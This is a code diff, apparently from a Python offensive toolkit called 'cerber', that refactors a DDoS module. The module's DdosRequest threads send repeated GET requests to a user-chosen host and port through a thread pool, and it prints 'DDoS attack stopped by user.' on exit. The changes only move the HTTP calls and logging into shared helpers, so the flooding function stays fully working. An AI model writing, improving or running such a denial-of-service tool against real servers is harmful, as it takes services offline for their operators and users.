@@ -4,9 +4,10 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 
 from cerber.ddfu.src.common import header_service
-from requests import request as req
 import threading
 from print_color import print
+
+from cerber.utils import RequestService, Logger
 
 
 class DdosRequest(threading.Thread):
@@ -35,11 +36,7 @@ class DdosRequest(threading.Thread):
         url = f'{self.target}{port}'
 
         try:
-            res = req(
-                method='GET',
-                url=url,
-                headers=header_service.header(url)
-            )
+            res = RequestService.get(url, {}, header_service.header(url))
             if res.status_code < 300:
                 print(url, color='c', tag_color='g', tag=f"{res.status_code}")
             elif 300 < res.status_code < 400:
@@ -48,8 +45,7 @@ class DdosRequest(threading.Thread):
                 print(url, color='w', tag_color='r', tag=f"{res.status_code}")
 
         except Exception as e:
-            print(e)
-            pass
+            Logger.error(e)
 
 
 def run_ddos_request(host: str, port: int, user_thread: int):
@@ -59,5 +55,5 @@ def run_ddos_request(host: str, port: int, user_thread: int):
                 executor.submit(DdosRequest(target=host, port=port).run)
                 time.sleep(0.1)  # Задержка между запросами
         except KeyboardInterrupt:
-            print("DDoS attack stopped by user.")
+            Logger.info("DDoS attack stopped by user.")
             exit(101)
